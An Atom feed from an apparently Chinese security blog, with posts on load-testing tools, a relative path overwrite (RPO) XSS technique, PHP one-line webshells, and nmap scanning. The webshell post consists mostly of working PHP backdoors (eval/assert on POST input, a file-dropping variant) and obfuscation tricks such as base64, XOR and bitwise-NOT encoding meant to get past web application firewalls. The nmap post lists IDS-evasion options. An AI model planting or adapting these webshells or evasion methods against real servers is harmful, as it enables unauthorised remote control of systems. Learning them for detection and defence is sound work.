<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://0kccc.github.io</id>
    <title>okc</title>
    <updated>2021-03-25T03:20:01.884Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://0kccc.github.io"/>
    <link rel="self" href="https://0kccc.github.io/atom.xml"/>
    <subtitle>突击小分队~</subtitle>
    <logo>https://0kccc.github.io/images/avatar.png</logo>
    <icon>https://0kccc.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, okc</rights>
    <entry>
        <title type="html"><![CDATA[几款常见的压测工具比较]]></title>
        <id>https://0kccc.github.io/post/ji-kuan-chang-jian-de-ya-ce-gong-ju-bi-jiao/</id>
        <link href="https://0kccc.github.io/post/ji-kuan-chang-jian-de-ya-ce-gong-ju-bi-jiao/">
        </link>
        <updated>2021-03-25T02:42:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="1abapache-benchmark">1.ab（Apache Benchmark）</h3>
<ul>
<li>简介<br>
ab就是Apache Benchmark的缩写，顾名思义它是Apache组织开发的一款web压力测试工具。ab又是一个命令行工具，使用方便，统计功能强大，对发起负载的本机要求很低，根据ab命令可以创建很多的并发访问线程，模拟多个访问者同时对某一URL地址进行访问，因此可以用来测试目标服务器的负载压力，但是没有图形化结果，不能监控。</li>
<li>安装</li>
</ul>
<pre><code># linux安装
sudo yum -y install httpd
# windows安装
https://www.apachelounge.com/download/ 直接下载解压使用
</code></pre>
<ul>
<li>使用</li>
</ul>
<pre><code>Usage: ab [options] [http[s]://]hostname[:port]/path
用法：ab [选项] 地址

选项：
Options are:
    -n requests      #执行的请求数，即一共发起多少请求。
    -c concurrency   #请求并发数。
    -s timeout       #指定每个请求的超时时间，默认是30秒。
    -k               #启用HTTP KeepAlive功能，即在一个HTTP会话中执行多个请求。默认时，不启用KeepAlive功能。
</code></pre>
<ul>
<li>结果<br>
例如：对baidu.com发起30个请求，并发数为3<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/1.png" alt="" loading="lazy"></li>
</ul>
<h3 id="2jmeter">2.jmeter</h3>
<ul>
<li>简介<br>
Apache JMeter是Apache组织开发的基于Java的压力测试工具，在很多场合如个人测试，企业测试中都有广泛应用。</li>
<li>安装<br>
直接访问<a href="http://jmeter.apache.org/download_jmeter.cgi">http://jmeter.apache.org/download_jmeter.cgi</a>下载解压使用<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/2.png" alt="" loading="lazy"></li>
<li>使用<br>
JMeter使用功能强大，这里我以简单的测试例子来做下介绍<br>
添加线程组<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/3.png" alt="" loading="lazy"><br>
设置线程组参数<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/4.png" alt="" loading="lazy"><br>
在线程租添加HTTP请求<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/5.png" alt="" loading="lazy"><br>
设置HTTP请求详细信息<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/6.png" alt="" loading="lazy"><br>
可以在该HTTP请求下添加运行结果监视器<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/7.png" alt="" loading="lazy"><br>
运行<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/8.png" alt="" loading="lazy"></li>
<li>结果<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/9.png" alt="" loading="lazy"><br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/10.png" alt="" loading="lazy"><br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/11.png" alt="" loading="lazy"></li>
</ul>
<h3 id="3locust">3.locust</h3>
<ul>
<li>简介<br>
locust是非常简单易用、分布式、python开发的压力测试工具。支持分布式测试，跨平台、易扩展，有图形化界面，可以快捷操作和下载报告。</li>
<li>安装</li>
</ul>
<pre><code># 支持的python版本：2.7、3.X
# pip3 安装locust
pip3  install locust
# 查看是否安装成功
locust -h
# 运行 Locust 分布在多个进程/机器库
pip3 install pyzmq
# webSocket 压测库
pip3 install websocket-client
</code></pre>
<ul>
<li>使用<br>
编写压测脚本<strong>ceshi.py</strong></li>
</ul>
<pre><code>from locust import HttpLocust, TaskSet, task

# 定义用户行为
class UserBehavior(TaskSet):

    @task
    def baidu_index(self):
        self.client.get(&quot;/&quot;)


class WebsiteUser(HttpLocust):
    task_set = UserBehavior # 指向一个定义的用户行为类
    min_wait = 3000 # 执行事务之间用户等待时间的下界（单位：毫秒）
    max_wait = 6000 # 执行事务之间用户等待时间的上界（单位：毫秒）
</code></pre>
<p>简单的运行</p>
<pre><code>locust -f locust测试脚本.py --host=URL地址
</code></pre>
<p>访问 http://localhost:8089 进入压测首页,点击start swarming进入压测界面<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/12.png" alt="" loading="lazy"></p>
<ul>
<li>结果<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/13.png" alt="" loading="lazy"></li>
</ul>
<h2 id="比较">比较：</h2>
<table>
<thead>
<tr>
<th></th>
<th>ab</th>
<th>Jmeter</th>
<th>locust</th>
</tr>
</thead>
<tbody>
<tr>
<td>使用语言</td>
<td>C</td>
<td>Java</td>
<td>Python</td>
</tr>
<tr>
<td>图形界面</td>
<td>无</td>
<td>有</td>
<td>有</td>
</tr>
<tr>
<td>优势</td>
<td>使用简单，上手学习较快，提供需要的基本性能指标</td>
<td>功能强大，插件丰富，支持生成HTML报告</td>
<td>支持分布式、压测数据支持导出</td>
</tr>
</tbody>
</table>
<h2 id="参考">参考：</h2>
<p>https://docs.locust.io/en/stable/<br>
https://httpd.apache.org/docs/2.2/programs/ab.html<br>
https://jmeter.apache.org/usermanual/get-started.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[RPO攻击技术分析]]></title>
        <id>https://0kccc.github.io/post/rpo-gong-ji-ji-zhu-fen-xi/</id>
        <link href="https://0kccc.github.io/post/rpo-gong-ji-ji-zhu-fen-xi/">
        </link>
        <updated>2020-12-25T02:21:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="rpo攻击是什么">RPO攻击是什么</h2>
<p>RPO全称Relative Path Overwrite(相对路径覆盖)，一种“欺骗”型攻击技术。其原理就是<strong>利用服务器与浏览器对URL解析的差异，将页面中使用相对路径引入的静态资源文件解析成其他资源文件或者我们可以控制内容的页面</strong>，从而导致XSS、任意文件读取、信息泄露等漏洞的产生。</p>
<h2 id="利用条件">利用条件</h2>
<ul>
<li>配置错误的apache服务器(开启AllowEncodedSlashes选项),或者nginx服务器。</li>
<li>存在相对路径的js或者css的引用</li>
</ul>
<h4 id="服务器解析差异">服务器解析差异</h4>
<p>要利用该漏洞首先得了解不同服务器的解析差异，我们可以通过一个简单的测试来区分服务器对URL的解析差异，现在可以在rpotest目录下创建一个空的test文件夹和一个内容为“I'm rpotest”的test.php文件,当成功访问时会输出该内容。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/rpo.png" alt="" loading="lazy"><br>
现在分别请求apache和nginx服务器下该链接的访问情况:<strong>http://127.0.0.1/rpotest/xxxxx/..%2Ftest.php</strong></p>
<ul>
<li>apache:<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/apache.png" alt="" loading="lazy"></li>
<li>nginx:<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/nginx.png" alt="" loading="lazy"><br>
从上图的访问情况可以看到对于同样的URL,apache和nginx服务器的处理方式是不同的，Apache服务器默认情况下是不解析%2F,也就是说服务器解析处理到xxxxx目录后认为..%2Ftest.php是一个文件，此时没有这个文件的所以返回404；而ngin服务器会先解码%2F为/，请求会变成/rpotest/xxxxx/../test.php，并且../会向前跳转到rpotest目录下，ci此时rpotest目录下有test.php文件，所以成功返回内容。</li>
</ul>
<h2 id="漏洞利用">漏洞利用</h2>
<p>在rpotest目录下创建一个test.php和一个空的rpo.js，test文件夹内创建另一个内容为alert('QAQ')的rpo.js。<br>
test.php内容：</p>
<pre><code>&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;rpo攻击测试&lt;/title&gt;
    &lt;script type=&quot;text/javascript&quot; src=&quot;rpo.js&quot;&gt;&lt;/script&gt; //这里引用相对路径下的rpo.js
&lt;/head&gt;
&lt;body&gt;
    &lt;?php echo &quot;RPO test&quot;; ?&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre>
<p>先来看下正常访问test.php时，会加载根目录下的rpo.js(即rpotest目录下这个空的rpo.js)  。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/rpojs.png" alt="" loading="lazy"><br>
但是当我们访问<strong>http://127.0.0.1/rpotest/test/..%2ftest.php</strong>时会发现该test.php竟然会调用test文件夹下rpo.js然后出现弹框现象？<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/test-js.png" alt="" loading="lazy"><br>
我们来深度解析一下这一现象具体是怎么实现的：当我们访问http://127.0.0.1/rpotest/test/..%2ftest.php时向服务器发起请求，服务器首先解码%2F然后向上目录跳转即：http://127.0.0.1/rpotest/test.php，  然后返回test.php给浏览器，由浏览器开始处理test.php中的各css、js脚本；但是由于浏览器并不会解码%2F这个符号，所以浏览器加载的还是http://127.0.0.1/rpotest/test/..%2ftest.php这个url，同样的把会把..%2ftest.php当成一个文件，所以当前目录是/test,并且此时test.php引用的相对路径下的rpo.js文件是/test/rpo.js,因此造成弹框！</p>
<h3 id="特性利用">特性利用</h3>
<p>如果是开启URL重写的伪静态网站的话(pathinfo模式)，那么漏洞利用将会变得轻而易举了。什么是pathinfo模式？简单举例你一定一看就懂：</p>
<pre><code>http://xxx.com/news/index.php?test=123
等同于
http://xxx.com/news/123.html
</code></pre>
<ul>
<li>apache要开启pathinfo模式:</li>
</ul>
<pre><code>&lt;Directory /&gt;
Options +Indexes +FollowSymLinks +ExecCGI
AllowOverride All
Order allow,deny
Allow from all
#AcceptPathInfo on   #增加这行配置
Require all granted
&lt;/Directory&gt;
</code></pre>
<ul>
<li>nginx增加pathinfo模式配置:</li>
</ul>
<pre><code>server {
        listen       80;
        server_name  localhost;
        root   &quot;D:/good&quot;;
        location / {
           index  index.html index.htm index.php;
           autoindex  off;
           if (!-e $request_filename) {
              rewrite ^/(.*)  /index.php/$1 last;
            } 
        }
        
        location ~ \.php(.*)$  {
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            fastcgi_split_path_info  ^((?U).+\.php)(/?.+)$;
            fastcgi_param  SCRIPT_FILENAME       $document_root$fastcgi_script_name;
            fastcgi_param  PATH_INFO  $fastcgi_path_info;
            fastcgi_param  PATH_TRANSLATED      $document_root$fastcgi_path_info;
            include        fastcgi_params;
        }
     }
</code></pre>
<p>这里我们配置好开启pathinfo模式的apache服务器，测试一下<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/123.png" alt="" loading="lazy"><br>
创建一个test.php和一个内容alert('QAQ')的1.html文件</p>
<pre><code>//test.php内容：
&lt;html&gt;
    &lt;head&gt;RPO attack test&lt;/head&gt;
    &lt;body&gt;
        &lt;script src=&quot;1.js&quot;&gt;&lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
&lt;?php
error_reporting(E_ALL^E_NOTICE^E_WARNING);
if($_GET['page'])
{
    $a=$_GET['page'];
    Header('Location:http://127.0.0.1/rpotest/test/'.&quot;$a&quot;.'.html');
}
?&gt;
</code></pre>
<p>然后访问：http://127.0.0.1/rpotest/test.php/page/1/..%2f..%2f..%2ftest.php<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/rpoxss.png" alt="" loading="lazy"><br>
我们会发现竟然将1.html没有标签的纯文本内容当作javascript语句执行，这是因为和上述一样当浏览器解析到..%2f..%2f..%2ftest.php时把这一堆当作一个文件，然后加载是的http://127.0.0.1/rpotest/test.php/page/1/1.js,而且test.php里面写的请求是<script src="1.js"></script>，所以返回的内容(1.html)会被当成js解析，所以造成了弹框现象。</p>
<h2 id="漏洞防护">漏洞防护</h2>
<p>在页面中避免直接使用相对路径进行静态文件的加载。</p>
<h2 id="总结">总结</h2>
<p>在实际场景中可能需要网站有可控的未声明的<!DOCTYPE html>输出点，并且使用相对路径的js、css加载方式或者开启pathinfo模式；但如果细心的研究这些利用技巧的话，可能会有意想不到的收获！</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PHP一句话分析]]></title>
        <id>https://0kccc.github.io/post/php-yi-ju-hua-fen-xi/</id>
        <link href="https://0kccc.github.io/post/php-yi-ju-hua-fen-xi/">
        </link>
        <updated>2020-11-18T06:14:33.000Z</updated>
        <content type="html"><![CDATA[<h1 id="webshell含义">Webshell含义</h1>
<p>webshell 就是以网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。顾名思义，web的含义是显然需要服务器开放web服务，shell的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于 webshell 其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。<br>
一句话木马、小马、大马都可以叫 webshell。</p>
<pre><code>一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。
</code></pre>
<h2 id="一句话木马原理php">一句话木马原理（PHP）</h2>
<p>一句话木马的原理是利用了PHP中的eval()。注：eval是因为是一个语言构造器而不是一个函数。</p>
<pre><code>1）PHP eval() 把字符串按照 PHP 代码来计算。
2）该字符串必须是合法的 PHP 代码，且必须以分号结尾。
3）如果没有在代码字符串中调用return语句，则返回NULL。如果代码中存在解析错误，则 eval() 函数返回 false。
</code></pre>
<p>主要会使用到函数及说明（<a href="https://www.php.net/manual/zh/">PHP手册</a>）：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>eval</td>
<td>PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为PHP代码执行</td>
</tr>
<tr>
<td>assert</td>
<td>PHP 4, PHP 5,PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8版本后可以接受两个参数</td>
</tr>
<tr>
<td>正则匹配类</td>
<td>preg_replace/ mb_ereg_replace/preg_filter等</td>
</tr>
<tr>
<td>文件包含类</td>
<td>include/include_once/require/require_once/file_get_contents等</td>
</tr>
</tbody>
</table>
<p>基本的一句话木马：</p>
<pre><code>&lt;?php
@eval($_POST[a]);
?&gt;

注：@是忽略可能出现的错误,建议使用eval、assert时都加上
</code></pre>
<h2 id="一句话绕过">一句话绕过：</h2>
<h3 id="1特殊函数写webshell">1.特殊函数写webshell</h3>
<ul>
<li>call_user_func 回调函数</li>
</ul>
<p><strong>call_user_func</strong> 这个函数可以调用其它函数，被调用的函数是 call_user_func 的第一个函数，被调用的函数的参数是call_user_func的第二个参数。这样的一个语句也可以完成一句话木马。一些被waf拦截的木马可以配合这个函数绕过waf。<strong>call_user_func + assert 构造的一句话木马在 php 7.0 版本及以下可以使用</strong>(<em>注：在php&gt;=7.2版本后，禁用给assert()函数传入字符串参数，因为通过超全局常量$_GET['']获取的攻击者输入是字符串，这样传入assert函数就触发了禁用。但是直接assert(phpinfo())传入的参数是函数，所以就不会触发函数禁用，可以正常回显。</em>)</p>
<pre><code>&lt;?php
@call_user_func(assert,$_POST['a']);
?&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720201118142707.png" alt="" loading="lazy"></figure>
<pre><code>&lt;?php
@call_user_func(assert,phpinfo());
?&gt;
</code></pre>
<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/2.png" alt="image" loading="lazy"><br>
(这里call_user_func函数不能调用eval，因为eval是一个语言构造器而不是一个函数，不能被可变函数调用。call_user_func有两个参数，第一个参数要求是函数，而eval只是一个语言构造器而不是函数，所以不符合call_user_func的语法，调用eval就会报错。)</p>
<ul>
<li>preg_replace_callback()函数</li>
</ul>
<pre><code>&lt;?php
preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['pass']);
?&gt;
</code></pre>
<p>原理：通过create_function“创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。</p>
<ul>
<li>file_put_contents 函数</li>
</ul>
<pre><code>&lt;?php
$test='&lt;?php $a=$_POST[&quot;cmd&quot;];assert($a); ?&gt;';
file_put_contents(&quot;muma.php&quot;, $test);
?&gt;
</code></pre>
<p>这里利用函数生成muma.php木马文件。此木马文件的内容是<strong>file_put_contents函数</strong>(生成一个文件,第一个参数是文件名，第二个参数是文件的内容。)</p>
<h3 id="2bypass-waf">2.bypass WAF</h3>
<p>WAF 通常以关键字判断是否为一句话木马，但是可以通过对一句话木马的变形，动态调用，隐藏或者替换关键字，达到绕过WAF的目的。所以想要绕过 WAF，就需要掌握各种 PHP 小技巧，掌握的技巧多了，把技巧结合起来，才可以设计出符合当时环境的一句话木马。</p>
<ul>
<li>PHP变量函数</li>
</ul>
<pre><code>&lt;?php 
$a = &quot;eval&quot;;
$a(@$_POST['a']); 
?&gt;
</code></pre>
<ul>
<li>str_replace()函数<br>
函数功能：在第三个参数中，查找第一个参数，并替换成第二个参数。这里第二个参数为空字符串，就相当于删除&quot;Waldo&quot;。</li>
</ul>
<pre><code>&lt;?php
$a=str_replace(&quot;Waldo&quot;, &quot;&quot;, &quot;eWaldoval&quot;);
$a(@$_POST['a']);
?&gt;
</code></pre>
<ul>
<li>base64_decode()函数</li>
</ul>
<pre><code>&lt;?php
$a=base64_decode(&quot;ZXZhbA==&quot;);   //ZXZhbA== 是eval的base64加密
$a($_POST['a']);
?&gt;
</code></pre>
<ul>
<li>&quot;.&quot;操作符</li>
</ul>
<pre><code>//&quot;.&quot;并置操作符，连接两个及以上字符串；例如a=&quot;li&quot;,b=&quot;hua&quot;,c=a.b即c=lihua
&lt;?php
$a=&quot;e&quot;.&quot;v&quot;;
$b=&quot;a&quot;.&quot;l&quot;;
$c=$a.$b;
$c($_POST['a']);
?&gt;
</code></pre>
<ul>
<li>parse_str()函数</li>
</ul>
<pre><code>&lt;?php
$str=&quot;a=eval&quot;;
parse_str($str);  //生成一个变量$a，值为字符串&quot;eval&quot;
$a($_POST['a']);
?&gt;
</code></pre>
<ul>
<li>strtr()函数<br>
strtr(string,from,to)</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td>必需。规定要转换的字符串。</td>
</tr>
<tr>
<td>from</td>
<td>必需（除非使用数组）。规定要改变的字符。</td>
</tr>
<tr>
<td>to</td>
<td>必需（除非使用数组）。规定要改变为的字符。</td>
</tr>
<tr>
<td>array</td>
<td>必需（除非使用from和to）。数组，其中的键名是更改的原始字符，键值是更改的目标字符。</td>
</tr>
</tbody>
</table>
<pre><code>&lt;?php 
    $a = strtr('atestt','test','sser');
    $a($_POST['x']);
?&gt;
</code></pre>
<ul>
<li>异或操作<br>
在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。(PHP5)</li>
</ul>
<pre><code>&lt;?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');   // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');   // $__='_POST';
$___=$$__;
$_($___[_]);   // assert($_POST[_]);
?&gt;
</code></pre>
<ul>
<li>取反操作<br>
利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如'和'{2}的结果是&quot;\x8c&quot;，其取反即为字母s。利用这个特性就可以找些汉字来构造出assert。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/233.png" alt="" loading="lazy"></li>
</ul>
<pre><code>&lt;?php
$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');
$_=$__/$__;

$____='';
$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});

$_____='_';$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});

$_=$$_____;
$____($_[$__]);
?&gt;
</code></pre>
<h3 id="困境">困境：</h3>
<p>php7之后我们已经不能使用强大的assert函数了,waf只要把函数封死就可以有效的阻止webshell免杀,而eval并没有assert那么灵活。后期⼤家可能更加倾向使用大马。</p>
<h2 id="参考">参考：</h2>
<p><a href="https://xz.aliyun.com/t/3924">php一句话绕过技术分析</a><br>
<a href="http://blog.leanote.com/post/snowming/2e1ab18dfa80">一句话木马分析</a><br>
<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html#%22%3Ehttps://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">PHP回调后门</a><br>
<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#">无数字和字母的webshell</a><br>
<a href="https://xz.aliyun.com/t/5152">对于php免杀webshell的一些总结</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[nmap使用详解]]></title>
        <id>https://0kccc.github.io/post/nmap-shi-yong-xiang-jie/</id>
        <link href="https://0kccc.github.io/post/nmap-shi-yong-xiang-jie/">
        </link>
        <updated>2020-11-06T02:13:06.000Z</updated>
        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://0kccc.github.io/post-images/1604629436980.png" alt="" loading="lazy"></figure>
<h1 id="简单使用">简单使用：</h1>
<ul>
<li>扫描对外开放服务：nmap domain/ip<br>
<img src="https://0kccc.github.io/post-images/1604629443108.png" alt="" loading="lazy"></li>
<li>扫描指定端口： nmap -p 端口 ip<br>
<img src="https://0kccc.github.io/post-images/1604629450062.png" alt="" loading="lazy"></li>
</ul>
<pre><code>nmap -p 80 192.168.50.1
nmap -p 80,8081 192.168.50.1-253
还可以自定义端口参数：
-p端口范围：只扫描指定的端口。扫描1-1024号端口，可设定该选项为–p 1-1024。扫描1 〜65535端口时，可使用-p-选项。
-F（快速扫描）：将仅扫描100	个常用端口。
-r（顺序扫描）：指定这个选项后，程序将从按照从小到大的顺序扫描端口。
</code></pre>
<h1 id="进阶使用">进阶使用：</h1>
<ul>
<li>nmap的6种端口状态：</li>
</ul>
<pre><code>开放：工作于开放端口的服务器端的应用程序可以受理TCP连接、接收UDP数据包或者响 应SCTP（流控制传输协议）请求。
关闭：虽然我们确实可以访问有关的端口，但是没有应用程序工作于该端口上。
过滤：Nmap不能确定该端口是否开放。包过滤设备屏蔽了我们向目标发送的探测包。
未过滤：虽然可以访问到指定端口，但Nmap不能确定该端口是否处于开放状态。 
打开｜过滤：Nmap认为指定端口处于开放状态或过滤状态，但是不能确定处于两者之中的 哪种状态。在遇到没有响应的开放端口时，Nmap会作出这种判断。这可以是由于防火墙丢 弃数据包造成的。
关闭｜过滤：Nmap认为指定端口处于关闭状态或过滤状态，但是不能确定处于两者之中的 哪种状态。
</code></pre>
<h2 id="常用参数">常用参数：</h2>
<ul>
<li>-sV(服务版本识别)<br>
<img src="https://0kccc.github.io/post-images/1604629468191.png" alt="" loading="lazy"></li>
<li>-O(操作系统检测)<br>
<img src="https://0kccc.github.io/post-images/1604629472695.png" alt="" loading="lazy"></li>
<li>-A(全面扫描)，包含了1-10000端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测；耗时较长。</li>
<li>-Pn(禁用主机检测)，如果主机屏蔽了ping请求，Nmap可能会认为该主机没有开机，就需要禁用Nmap的主机检测功能，也可跳过防火墙。</li>
<li>-vv(输出结果)，对扫描结果进行详细的输出。</li>
</ul>
<h1 id="深入使用了解一下">深入使用(了解一下):</h1>
<ul>
<li>TCP扫描：</li>
</ul>
<pre><code>1.TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行完整的三次 握手。如果成功建立连接，则判定该端口是开放端口。由于在检测每个端口时都需要进行三 次握手，所以这种扫描方式比较慢，而且扫描行为很可能被目标主机记录下来。如果启动 Nmap的用户的权限不足，那么默认情况下Nmap程序将以这种模式进行扫描。
2.SYN扫描（-sS）：该选项也称为半开连接或者SYN stealth。采用该选项后，Nmap将使用 含有SYN标志位的数据包进行端口探测。如果目标主机回复了SYN/ACK包，则说明该端口处 于开放状态：如果回复的是RST/ACK包，则说明这个端口处于关闭状态；如果没有任何响应 或者发送了ICMP unreachable信息，则可认为这个端口被屏蔽了。SYN模式的扫描速度非常 好。而且由于这种模式不会进行三次握手，所以是一种十分隐蔽的扫描方式。如果启动Nmap 的用户有高级别权限，那么在默认情况下Nmap程序将以这种模式进行扫描。
3.TCP NULL（-sN）、FIN（-sF）及XMAS（-sX）扫描：NULL 扫描不设置任何控制位； FIN扫描仅设置FIN标志位：XMAS扫描设置FIN、PSH和URG的标识位。如果目标主机返回 了含有RST标识位的响应数据，则说明该端口处于关闭状态；如果目标主机没有任何回应， 则该端口处于打开｜过滤状态。
4.TCP Maimon扫描（-sM）：Uriel Maimon 首先发现了TCP Maimom扫描方式。这种模式的 探测数据包含有FIN/ACK标识。对于BSD衍生出来的各种操作系统来说，如果被测端口处于 开放状态，主机将会丢弃这种探测数据包；如果被测端口处于关闭状态，那么主机将会回复 RST。
5.TCPACK扫描（-sA）：这种扫描模式可以检测目标系统是否采用了数据包状态监测技术 （stateful）防火墙，并能确定哪些端口被防火墙屏蔽。这种类型的数据包只有一个ACK标识 位。如果目标主机的回复中含有RST标识，则说明目标主机没有被过滤。
6.TCP窗口扫描（-sW）：这种扫描方式检测目标返回的RST数据包的TCP窗口字段。如果目 标端口处于开放状态，这个字段的值将是正值；否则它的值应当是0。
7.TCP Idle扫描（-sI）：采用这种技术后，您将通过指定的僵尸主机发送扫描数据包。本机 并不与目标主机直接通信。如果对方网络里有IDS，IDS将认为发起扫描的主机是僵尸主机。
</code></pre>
<ul>
<li>UDP扫描选项：</li>
</ul>
<pre><code>Nmap有多种TCP扫描方式，而UDP扫描仅有一种扫描方式（-sU）。虽然UDP扫描结果没有 TCP扫描结果的可靠度高，但渗透测试人员不能因此而轻视UDP扫描，毕竟UDP端口代表着 可能会有价值的服务端程序。但是UDP扫描的最大问题是性能问题。由干Linux内核限制1秒内最多发送一次ICMP Port Unreachable信息。按照这个速度，对一台主机的65536个UDP端口进行完整扫描，总耗时必 定会超过18个小时。
优化方法：
1.进行并发的UDP扫描；
2.优先扫描常用端口；
3.在防火墙后面扫描；
4.启用--host-timeout选项以跳过响应过慢的主机。
</code></pre>
<ul>
<li>规避主机检测：</li>
</ul>
<pre><code>如果目标主机通常处于防火墙或IDS系统的保护内，使用Nmap的默认选项进行扫描，可能会被发现并且扫不出任何结果。所以，我们可以使用Nmap自带的绕过检测参数。
-f（使用小数据包）：这个选项可避免对方识别出我们探测的数据包。指定这个选项之后，Nmap将使用8字节甚至更小数据体的数据包。
--mtu：这个选项用来调整数据包的包大小。MTU（Maximum	Transmission Unit，最大传输单元）必须是8的整数倍，否则Nmap将报错。
-D（诱饵）：这个选项应指定假IP(诱饵的IP)。启用这个选项之后，Nmap在发送侦测数据包的时候会掺杂一些源地址是假IP（诱饵）的数据包。这种功能意在以藏木于林的方法 掩盖本机的真实	IP。也就是说，对方的log还会记录下本机的真实IP。您可使用RND生成随机 的假IP地址，或者用RND：number的参数生成&lt;number&gt;个假IP地址。您所指定的诱饵主机 应当在线，否则很容易击溃目标主机。另外，使用了过多的诱饵可能造成网络拥堵。尤其是 在扫描客户的网络的时候，您应当极力避免上述情况。
--source-port &lt;portnumber&gt;或-g（模拟源端口）：如果防火墙只允许某些源端口的入站流量，这个选项就非常有用。
--data-length：这个选项用于改变Nmap	发送数据包的默认数据长度，以避免被识别出来是Nmap的扫描数据。
--max-parallelism：这个选项可限制Nmap并发扫描的最大连接数。
--scan-delay &lt;time&gt;：这个选项用于控制发送探测数据的时间间隔，以避免达到IDS/IPS端口扫描规则的阈值。
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hello world]]></title>
        <id>https://0kccc.github.io/post/hello-gridea/</id>
        <link href="https://0kccc.github.io/post/hello-gridea/">
        </link>
        <updated>2018-12-11T16:00:00.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
<!-- more -->
<p><a href="https://github.com/getgridea/gridea">Github</a><br>
<a href="https://gridea.dev/">Gridea 主页</a><br>
<a href="http://fehey.com/">示例网站</a></p>
<h2 id="特性">特性👇</h2>
<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
<p>🏷️  你可以对文章进行标签分组</p>
<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
<p>💻  你可以在 <strong>Windows</strong>，<strong>MacOS</strong> 或 <strong>Linux</strong> 设备上使用此客户端</p>
